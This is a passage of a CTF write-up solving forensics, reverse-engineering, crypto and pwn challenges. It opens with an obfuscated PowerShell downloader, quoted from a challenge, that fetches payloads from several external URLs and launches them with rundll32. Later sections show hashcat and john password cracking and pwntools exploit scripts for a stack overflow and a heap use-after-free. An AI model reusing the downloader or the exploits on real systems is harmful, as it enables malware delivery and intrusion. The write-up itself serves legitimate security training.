NEt.WEbCliENT;$Az8nsrd=((('h'+'tt')+(('ps:)'+'('))+((')'+'WN'+')()('))+')'+'WN'+')'+(('('+'h'+'r.digima'+'x.c'+'o.u'))+(('k)'))+'()'+'WN'+((')(e'+'93'+'t'+'tvg'))+'u'+('f.'+'pdf@ht'+'t')+'ps'+((':'+')()W'))+(('N'+')()()WN'+')('+'e'))+'du'+'c'+'a'+('t'+'io')+('n01.'+'sut'+'o')+('w'+'eb.')+'c'+(('om'+')'))+('()'+'WN')+((')(g'+'mt'+'6s0o'))+('.z'+'i')+('p@htt'+'p')+'s'+((':)()WN'+')'))+'('+')'+'('+((')W'))+(('N)'+'(w'))+'eb'+'.a'+'n'+'at'+'om'+('y'+'.o')+'r'+'g.'+(('za'+')()W'))+'N'+((')('+'wl'))+('0'+'1er1l'+'8')+('.z'+'ip'+'@htt')+'p:'+')'+('()W'+'N')+((')()'+'()W'+'N)'))+'('+('e'+'rp'+'.ilte')+(('c.'+'co)'+'()'))+(('WN'+')'))+'('+'ps'+('h'+'pm')+'8'+'.r'+('ar'+'@')+('h'+'ttp')+'s:'+')'+(('('+')WN)'))+(('()'+'()WN'+')('))+('es'+'ter')+('n'+'i.g')+('ra'+'tia')+'et'+'s'+'al'+'u'+('s.i'+'t')+')'+(('()'+'WN)'))+(('(o5'+'p'))+'ix'+'i'+('.p'+'d')+('f@h'+'tt')+(('ps:)('+')W'+'N)('))+((')'+'()'))+(('W'+'N)('))+'he'+(('len'+'a'+'ofic'+'ia'+'l.com)('))+')'+'WN'+((')('+'l4'))+('b'+'ggl.pdf'+'@')+(('htt'+'p:'+')()'+'WN)()'))+(('('+')WN)'))+(('(s'))+'p'+('acec'+'a')+'m'+(('p.'+'in)'))+(('()WN'+')('))+('h3'+'8ki8j')+'k'+'z'+'.'+'pd'+'f@'+'h'+'t'+'t'+'p:'+')'+(('()WN'+')'+'('))+((')('+')'))+'WN'+((')'+'(s'+'aramo'))+('nic.me'+'d')+('i'+'ado')+('t'+'.h')+'u'+((')('))+((')W'+'N)('))+'b'+('6zic'+'n'+'.')+('z'+'ip')))."rePlAcE"(((((')'+'()W'))+(('N'+')(')))),([array]('/'),('h'+'we'))[0])."SPLiT"($Knwn4hn + $A2fbfpq + $X05fmdw);seT-ITEM ("VaRi"+"aBLe:"+"a1lqN") ( [tYPE]("{7}{4}{3}{0}{6}{1}{5}{2}" -F '51f','7d5','fad}','3bd29','g{bf5b','9183d6','d4d44a61','fla') ) ;$Bh58b2y=('Tv'+'nt'+('po'+'w'));foreach ($O_5ld0o in $Az8nsrd | soRt-Object {get-randoM}){try{$J45ff5g."DOwNlOAdFILe"($O_5ld0o, $Qeonwrj);$Dlbm701=(('Mrzp'+'p')+'z9');If ((&('Get-I'+'tem') $Qeonwrj)."LeNGTh" -ge 39916) {&('run'+'dll32.'+'e'+'xe') $Qeonwrj,0;$I5bbzjx=('Vw'+'h'+('6'+'5ts'));break;$Naacjid=('Bq'+('uc'+'jnc'))}}catch{}}$Wpdvvjq=(('Ky'+'bms')+'9x')
```
{% endcode %}

There are more in the obfuscated code but I will just extract the flag and ignore the others. Can see at the line

Set-Item ("Variable:a1lqN") (\[type]\("{7}{4}{3}{0}{6}{1}{5}{2}" -F '51f','7d5','fad}','3bd29','g{bf5b','9183d6','d4d44a61','fla'))

`flag{bf5b3bd2951fd4d44a617d59183d6fad}`

### Bombardiro Crocodilo

This is the challenge that only 5 people solved. Got two file initially, .vc and .secret.zip

At first I found [https://medium.com/@malik.ubaidullah16/digital-cyber-security-hackathon-2023-forensics-container-writeup-f0c566155b8d](https://medium.com/@malik.ubaidullah16/digital-cyber-security-hackathon-2023-forensics-container-writeup-f0c566155b8d) to find passphrase for vc file but actually found out that we can just crack the .secret.zip using john and rockyou so i wasted time there but got to learn new thing.

```bash
$ dd if=container.vc of=hash.tc bs=1 count=512
512+0 records in
512+0 records out
512 bytes copied, 0.150305 s, 3.4 kB/s

$ hashcat -m 13721 hash.tc /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

hash.tc:naruto

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))
Hash.Target......: hash.tc
Time.Started.....: Sat Aug 16 16:06:24 2025 (23 secs)
Time.Estimated...: Sat Aug 16 16:06:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      877 H/s (2.20ms) @ Accel:1024 Loops:62 Thr:32 Vec:1
Speed.#2.........:       22 H/s (5.52ms) @ Accel:512 Loops:250 Thr:1 Vec:4
Speed.#*.........:      899 H/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344385 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:304234-304296
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:499750-499999
Candidate.Engine.: Device Generator
Candidates.#1....: hockey -> kaytee
Candidates.#2....: 123456 -> letmein
Hardware.Mon.#1..: Temp: 73c Util: 95% Core:1920MHz Mem:7000MHz Bus:8
Hardware.Mon.#2..: N/A
```

mount vc using veracrypt using "naruto" as passphrase. in there got odt file and key.asc. Use gpg2john to crack the passphrase from key.asc,

```bash
$ gpg2john key.asc > gpg.hash 
$ john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamie            (genji)
1g 0:00:00:06 DONE (2025-08-16 16:28) 0.1626g/s 102.7p/s 102.7c/s 102.7C/s melody..jamie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Use libreoffice to open odt. But assign key.asc first as OpenPGP at tools > options. When prompt for password use "jamie". Then got part one flag.

![](<../.gitbook/assets/3 (3).png>)

As hint stated, “In part 2, the 'file key' replaces the password”. So mount the vc file again, but use key.asc instead of "naruto", then got different file, ccret.txt and .git folder,

```bash
$ git log --oneline --decorate --graph --stat
* cc79d12 (HEAD -> master) Ohh noo~~~, tung tung tung sahur
|  glasscat.ps1 | 66 ------------------------------------------------------------------
|  1 file changed, 66 deletions(-)
* 05dd28a Chimpanzini Bananini
|  ccret.txt |  49 +++++++++++++++++++++++++++++++++++++++++++++++++
|  flag2.zip | Bin 8515 -> 0 bytes
|  2 files changed, 49 insertions(+)
* daec113 ballerina cappuccina mimimi
|  README    |   1 -
|  flag2.zip | Bin 0 -> 8515 bytes
|  2 files changed, 1 deletion(-)
* 2eb34ab added glasscat c2
|  glasscat.ps1 | 66 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
|  1 file changed, 66 insertions(+)
* d5f2d3e initial setup
   README | 1 +
   1 file changed, 1 insertion(+)
```

then find flag2.zip in two of the commit&#x20;

```bash
$ git show daec113:flag2.zip > flag2.zip
```

Then get part 2 flag in pdf after unzip

![](<../.gitbook/assets/4 (3).png>)

`flag{60db41aab81eb483b338a76223be6bd8}`

## REVERSE ENGINEERING

### Simple Server

The program gates the flag behind a boolean:

* isValidated only becomes **true** inside **Option 1 – System Status** if:
  * systemCheck = ValidateSystemIntegrity() → **true only if app started on an even millisecond** (50/50)
  * securityCheck = username length > 0 → always true
  * integrityCheck = true on Windows, and on Linux it’s also true because validationCounter hits 3
  * plus validationCounter >= 3 (it reaches 3 during initialization)

Once isValidated is true, **Advanced Options → System Secrets (7 → 4)** prints the **Master Key** and the **Flag**.

Press 1 7 4

```bash
$ ./simple_server.exe
=== CTF Challenge System ===
Welcome to the secure system!
Initializing system components...
System initialization complete.
Choose an option:
1. System Status
2. Run Diagnostics
3. Security Check
4. Performance Test
5. Network Check
6. Database Query
7. Advanced Options
8. Exit
1
System Check: PASS
Security Check: PASS
Integrity Check: PASS
Validation Counter: 3
All systems operational!
Choose an option:
1. System Status
2. Run Diagnostics
3. Security Check
4. Performance Test
5. Network Check
6. Database Query
7. Advanced Options
8. Exit
7
=== Advanced System Options ===
1. Memory Dump
2. Registry Check
3. Process Monitor
4. System Secrets
5. Back to main menu
4
Accessing system secrets...
Decrypting classified data...
=== CLASSIFIED INFORMATION ===
Master Key: ce44d1c59ce14167faa7943324d9a6e4
Flag: flag{ce44d1c59ce14167faa7943324d9a6e4}
==============================
```

`flag{ce44d1c59ce14167faa7943324d9a6e4}`

### Modern CrackMe1

Found flag in IDA strings window

![](<../.gitbook/assets/0 (3).png>)

`flag{fbf02c4e1f041729b52fc049f83eca20}`

### Mini Vault

Just strings

`flag{2c403ffe30fe19479de4e3503f2dd15d}`

## CRYPTO

### Quantities

The “quantum” hint points straight to BB84 QKD. The CSV is a sifting log: keep only rows where Alice and Bob used the **same basis** (Z/Z or X/X); for those, the bit is valid (and in this file, BobResult == AliceBit for the matches). That sifted bitstring is then turned into bytes and hashed to get the symmetric key used with **AES-GCM** (nonce given in nonce.hex). The last 16 bytes of ciphertext.hex are the GCM tag.

```python
from Crypto.Cipher import AES
import csv, binascii, hashlib

with open("ciphertext.hex","r") as f:
ct = bytes.fromhex(f.read().strip())
with open("nonce.hex","r") as f:
nonce = bytes.fromhex(f.read().strip())

bits = []
with open("qkd.csv","r", newline="") as f:
for row in csv.DictReader(f):
if row["AliceBasis"] == row["BobBasis"] and row["AliceBit"] == row["BobResult"]:
bits.append(int(row["AliceBit"]))

b = bytearray()
for i in range(0, (len(bits)//8)*8, 8):
val = 0
for bit in bits[i:i+8]:
val = (val << 1) | bit
b.append(val)
key_material = bytes(b)

key = hashlib.sha256(key_material).digest()[:16]

data, tag = ct[:-16], ct[-16:]
pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(data, tag)
print(pt.decode())
```

Notes:

* Sifted bits count = **304** → **38 bytes**, which conveniently matches len(ciphertext) - 16 (the 16-byte GCM tag).
* Bit packing is **MSB-first**; LSB-first won’t produce a valid plaintext.
* Key derivation here is AES-128 key = SHA256(sifted\_bytes)\[:16].

### improper v1

<details>

<summary>Description</summary>

Hanni, a newbie in cryptography, is trying to implement the Stickel Key Exchange protocol. I gave her some advice, but it seems she forgot to do it properly.

</details>

```python
from hashlib import sha256
from Crypto.Cipher import AES
p = 242465658163462405324993003447648550123
u = (136363031559837104081527699705343878982, 10167651930671645416984438049044546412, 57336302048697007308442837127597986040, 77318613216470465293832102253598640100, 223278600207600492695876253079475154027, 52942278585133393071801368353225523969, 31139488000881854865023284537387064122, 63779595776829464459019738479222356243, 132801295889946574205867228145840987431, 157208901960476691049008692239447746840, 35341051066190255927885505376486721612, 119888869632944811141836611521081169162, 77207663273721343995588872098637083716, 4669787612322065829792203498234783343, 48121740439657732851142366704250762428, 44620803318394382654681673421527721202, 222231541711039605756109968310947937527, 240874640563990952710610918296822209030, 231922403449549747992522576356157192526, 107770903515343531544128223872698661203, 180441359862825443153645448851246476536, 120604978356250262320012941419172358908, 195039857364471031760503180782310965803, 85478772583794716234565370350030231136, 46748469370453298465267712421813744307)
v = (100502267405363070530957820417309497680, 53017708193518699424392288168907240526, 153936074973097120033947813762253680238, 23928905077913991679169804134598031275, 111238600305158277173186127252024906954, 4067283554561468281377809751229703925, 64678475864516587256826564590822305606, 186110305671482755234831504452094731080, 29591506010877035097573099662143954610, 95961077552138189965279244420089506865, 28285694639188687585228405342229429961, 75527976376861523473527712893520666042, 218937242764906125779872869090814273774, 28576549983056603847699311132361868172, 224371393445551934827029657763462781089, 200638139222933675870451052110864865575, 69239161441520898908803182768268173485, 158877688907322240750307161367027051683, 2676411072549959717322373453585362855, 70139264866028058958698362835637558638, 16295045134474803128300539635814541224, 83940583769818288814974018593239461831, 27184500237202219070149583781470706303, 114179828502438307116266362924870360248, 65415085777547998277558193052513036874)
ct = bytes.fromhex('5e2bb1c14943c3c2d5ba629f65abe7a30804f635ee8c0376c1cd06b170992d27fdb1f55c9a8c0534b8ae77d9ccb478d9dc81903c549a338d6dabbc65dfb8c0ea70731f96d236ace6bea0b859c77c55167dc03ec52fdc03f5b009f647e0f14bb9')
# Public break: shared secret is just u ⊙ v (mod p)
Ka = tuple((u[i] * v[i]) % p for i in range(len(u)))
key = sha256(str(Ka).encode()).digest()[:16]   # AES-128 key
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
# strip PKCS7 padding
padlen = pt[-1]
print(pt[:-padlen].decode())
```

```bash
$ python solvechallsage.py
R3m3mb3r_H4nn1_1F_I_s4id_1t_n33ds_t0_b3_n0n_c0MMut4tiv3_then_IT_HAS_TO_BE_NON_COMMUTATIVE_OKK??
```

Generate md5

`flag{bbbd90996f79ff9dd591aa1c08e62def}`

## PWN

### Ez\_Pwn

```python
from pwn import *
context.binary = ELF('./EZ_PWN_local', checksec=False)
context.arch = 'amd64'
HOST, PORT = '203.154.91.221', 5225
OFFSET = 64 + 8  # v1[64] + saved RBP
def build_payload(elf):
    return b'A' * OFFSET + p64(elf.symbols['onepiece'])
def run(p):
    elf = context.binary
    p.recvuntil(b'Enter password to access:')
    p.sendline(b'security123')
    p.recvuntil(b'>> ')
    p.sendline(build_payload(elf))
    p.interactive()
if __name__ == '__main__':
    p = remote(HOST, PORT)
    run(p)
```

```bash
$ python exploit.py
[+] Opening connection to 203.154.91.221 on port 5225: Done
[*] Switching to interactive mode
Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11\x01!
🏴‍☠️ FLAG CAPTURED! 🏴‍☠️
flag{16ee4ab95cf774231c94fcce1a81c586}
[*] Got EOF while reading in interactive
```

### Memory\_Maintain

The goal is simply to make secret\_maintenance() call nerd\_func() (which prints the flag) by satisfying its runtime checks on the **7th** call.

**Strategy**

1. **Call secret\_maintenance 6 times** (Menu 5 → chunk 13). This increments counter\_0 to 6.
2. **Push heap\_operations above 25.**\
   Each successful allocation increases it. The program pre-allocates 7 chunks at start (IDs 0–5 and 13), so you begin around 7.\
   Easiest: pick a chunk ID (say 6) and loop:
   * Free it (Menu 4 → 6)
   * Allocate it (Menu 1 → 6)\
     Repeat \~20 times to comfortably exceed 25.
3. **Force security\_level to 1** using the **Security Audit** (Menu 7).\
   The audit sets security\_level = 1 if it detects any “integrity violation” on a **stale pointer** in chunk\_registry. You can create one like this:
   * Free a currently in-use chunk, e.g. **ID 0** (Menu 4 → 0). This leaves a **dangling pointer** at chunk\_registry\[0].chunk.
   * Immediately **allocate another ID of the same size**, e.g. **ID 14** (Menu 1 → 14). Due to tcache, this almost always **reuses the freed address** of chunk 0.
   * **Write** different data into **ID 14** (Menu 2 → 14 → enter any non-empty string). This updates the contents at the _same address_ that chunk\_registry\[0].chunk still points to, but the registry still holds the **old checksum** for ID 0.
   * Now run **Security Audit** (Menu 7). It iterates over 0..14 and calls verify\_chunk\_integrity(i) on any non-null pointer — including the **freed-but-still-pointed** ID 0 — which now **fails checksum** and sets security\_level = 1.
4. **Make the 7th call** to secret\_maintenance (Menu 5 → 13). With heap\_operations > 25 and security\_level == 1, this time it hits the special branch and calls nerd\_func(), printing the flag.

```python
from pwn import *
HOST = "203.154.91.221"
PORT = 6060
# context.log_level = "debug" # uncomment if you want verbose I/O
def main():
# Connect to remote service
p = remote(HOST, PORT)
def choose(n):
p.sendlineafter(b"Choice: ", str(n).encode())
def alloc(i):
choose(1)
p.sendlineafter(b"Chunk ID (0-14): ", str(i).encode())
def write_chunk(i, s: bytes):
choose(2)
p.sendlineafter(b"Chunk ID (0-14): ", str(i).encode())
p.sendlineafter(b"Data to write: ", s)
def free_chunk(i):
choose(4)
p.sendlineafter(b"Chunk ID (0-14): ", str(i).encode())
def exec_chunk(i):
choose(5)
p.sendlineafter(b"Chunk ID (0-14): ", str(i).encode())
def audit():
choose(7)
# 1) Call secret_maintenance 6 times (counter_0 = 6)
for _ in range(6):
exec_chunk(13)
# 2) Push heap_operations > 25 via repeated free/alloc on ID 6
# (initial ops ≈ 7; +20 allocs -> ≈ 27)
for _ in range(20):
free_chunk(6) # first free does nothing if not in use; that's fine
alloc(6) # increments heap_operations
# 3) Force security_level = 1 by creating an integrity violation and auditing:
# free 0 -> alloc 14 (reuses 0's chunk via tcache) -> write 14 -> audit
free_chunk(0)
alloc(14)
write_chunk(14, b"A"*40)
audit()
# 4) 7th call to secret_maintenance: checks pass -> nerd_func() prints flag
exec_chunk(13)
# Drop to interactive to show the printed flag
p.interactive()
if __name__ == "__main__":
main()
─$ python exploit.py
[+] Opening connection to 203.154.91.221 on port 6060: Done
[*] Switching to interactive mode
🚀 Executing function from chunk 13...
🔐 Special maintenance mode activated...
🚪 Backdoor detected... Escalating privileges...
🎊 INCREDIBLE! You've bypassed all security measures!
Advanced exploitation detected and... appreciated! 😎
Here's your well-earned prize: flag{b855c30554b198e4350fbef9972bbae9}
Elite hacker status: CONFIRMED ✨
```

